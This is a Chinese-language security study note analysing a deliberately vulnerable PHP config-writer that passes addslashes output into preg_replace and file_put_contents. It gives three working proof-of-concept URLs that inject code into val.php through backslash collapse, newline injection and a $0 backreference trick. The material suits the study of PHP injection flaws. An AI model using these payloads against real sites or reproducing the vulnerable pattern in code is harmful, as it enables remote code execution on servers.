#P师傅的经典漏洞
>今天刚进P师傅的小密圈就发现大家都在讨论P师傅出的漏洞，看了下，窝草都是奇技淫巧啊，赶快拿出小本本记下来

**问题代码**
```php
<?php
$str = addslashes($_GET['option']);
echo $str;
$file = file_get_contents('val.php');
$file = preg_replace('|\$option=\'.*\';|',"\$option='$str';",$file);
echo $file;
file_put_contents('val.php',$file);
?>
```
大概解释下，是一个类似修改配置的操作，利用在于怎么去通过file_put_contents来getshell

1.**preg_replace的奇怪特性**
**POC**
```url
127.0.0.1/test/eval/test.php?option=\';phpinfo();//
```
```url
\\\';phpinfo();//<?php
$option='\\';phpinfo();//';
?>
```
可以发现，两次打印的内容并不相同，本来addslash后的三个\\\，preg_repalce后变成了两个\\，从而成功的闭合了单引号

2.**可多次写入替换的特性**
**POC**
```url
http://127.0.0.1/test/eval/test.php?option=xxxx%27;%0aphpinfo();//
http://127.0.0.1/test/eval/test.php?option=x
```
这样val.php的内容被替换成
```php
<?php
$option='x';
phpinfo();//';
?>
```
这里在第一次注入换行，然后在第二次替换时用x替换掉x\'（因为.*不会匹配换行，并且是贪婪匹配模式，如果是非贪婪.*?，可以不用换行）

3.**脑洞特性**
**POC**
第一次
```url
http://127.0.0.1/test/eval/test.php?option=;phpinfo();
```
源代码变为
```php
<?php
$option=';phpinfo();';
?>
```
第二次
```url
http://127.0.0.1/test/eval/test.php?option=%00
```
源代码变为
```php
<?php
$option='$option=';phpinfo();';';
?>
```
[http://www.php.net/manual/zh/function.preg-replace.php](http://www.php.net/manual/zh/function.preg-replace.php)--在这里写到在第二个参数replacement中<font color=red>“\\0和$0代表完整的模式匹配文本”</font>，强，无敌
